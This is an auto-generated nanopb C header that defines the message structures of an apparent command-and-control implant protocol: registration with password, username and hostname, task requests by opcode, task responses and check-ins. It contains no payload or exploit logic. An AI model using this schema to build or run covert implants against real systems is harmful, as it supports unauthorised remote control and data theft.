/* Automatically generated nanopb header */
/* Generated by nanopb-0.4.8 */

#ifndef PB_IMPLANT_PB_H_INCLUDED
#define PB_IMPLANT_PB_H_INCLUDED
#include <pb.h>

#if PB_PROTO_HEADER_VERSION != 40
#error Regenerate this file with the current version of nanopb generator.
#endif

/* Struct definitions */
typedef struct _Register {
  char *Password;
  char *GUID;
  char *Username;
  char *Hostname;
} Register;

typedef struct _TaskRequest {
  char *TaskGuid;
  int32_t Opcode;
  char *Args;
} TaskRequest;

typedef struct _TaskResponse {
  char *TaskGuid;
  char *GUID; /* implant ID */
  pb_bytes_array_t *Response;
} TaskResponse;

typedef struct _ImplantCheckin {
  char *GUID;
  bool has_Resp;
  TaskResponse Resp;
} ImplantCheckin;

#ifdef __cplusplus
extern "C" {
#endif

/* Initializer values for message structs */
#define Register_init_default                                                  \
  { NULL, NULL, NULL, NULL }
#define TaskRequest_init_default                                               \
  { NULL, 0, NULL }
#define TaskResponse_init_default                                              \
  { NULL, NULL, NULL }
#define ImplantCheckin_init_default                                            \
  { NULL, false, TaskResponse_init_default }
#define Register_init_zero                                                     \
  { NULL, NULL, NULL, NULL }
#define TaskRequest_init_zero                                                  \
  { NULL, 0, NULL }
#define TaskResponse_init_zero                                                 \
  { NULL, NULL, NULL }
#define ImplantCheckin_init_zero                                               \
  { NULL, false, TaskResponse_init_zero }

/* Field tags (for use in manual encoding/decoding) */
#define Register_Password_tag 1
#define Register_GUID_tag 2
#define Register_Username_tag 3
#define Register_Hostname_tag 4
#define TaskRequest_TaskGuid_tag 1
#define TaskRequest_Opcode_tag 2
#define TaskRequest_Args_tag 3
#define TaskResponse_TaskGuid_tag 1
#define TaskResponse_GUID_tag 2
#define TaskResponse_Response_tag 3
#define ImplantCheckin_GUID_tag 1
#define ImplantCheckin_Resp_tag 2

/* Struct field encoding specification for nanopb */
#define Register_FIELDLIST(X, a)                                               \
  X(a, POINTER, SINGULAR, STRING, Password, 1)                                 \
  X(a, POINTER, SINGULAR, STRING, GUID, 2)                                     \
  X(a, POINTER, SINGULAR, STRING, Username, 3)                                 \
  X(a, POINTER, SINGULAR, STRING, Hostname, 4)
#define Register_CALLBACK NULL
#define Register_DEFAULT NULL

#define TaskRequest_FIELDLIST(X, a)                                            \
  X(a, POINTER, SINGULAR, STRING, TaskGuid, 1)                                 \
  X(a, STATIC, SINGULAR, INT32, Opcode, 2)                                     \
  X(a, POINTER, SINGULAR, STRING, Args, 3)
#define TaskRequest_CALLBACK NULL
#define TaskRequest_DEFAULT NULL

#define TaskResponse_FIELDLIST(X, a)                                           \
  X(a, POINTER, SINGULAR, STRING, TaskGuid, 1)                                 \
  X(a, POINTER, SINGULAR, STRING, GUID, 2)                                     \
  X(a, POINTER, SINGULAR, BYTES, Response, 3)
#define TaskResponse_CALLBACK NULL
#define TaskResponse_DEFAULT NULL

#define ImplantCheckin_FIELDLIST(X, a)                                         \
  X(a, POINTER, SINGULAR, STRING, GUID, 1)                                     \
  X(a, STATIC, OPTIONAL, MESSAGE, Resp, 2)
#define ImplantCheckin_CALLBACK NULL
#define ImplantCheckin_DEFAULT NULL
#define ImplantCheckin_Resp_MSGTYPE TaskResponse

extern const pb_msgdesc_t Register_msg;
extern const pb_msgdesc_t TaskRequest_msg;
extern const pb_msgdesc_t TaskResponse_msg;
extern const pb_msgdesc_t ImplantCheckin_msg;

/* Defines for backwards compatibility with code written before nanopb-0.4.0 */
#define Register_fields &Register_msg
#define TaskRequest_fields &TaskRequest_msg
#define TaskResponse_fields &TaskResponse_msg
#define ImplantCheckin_fields &ImplantCheckin_msg

/* Maximum encoded size of messages (where known) */
/* Register_size depends on runtime parameters */
/* TaskRequest_size depends on runtime parameters */
/* TaskResponse_size depends on runtime parameters */
/* ImplantCheckin_size depends on runtime parameters */

#ifdef __cplusplus
} /* extern "C" */
#endif

#endif
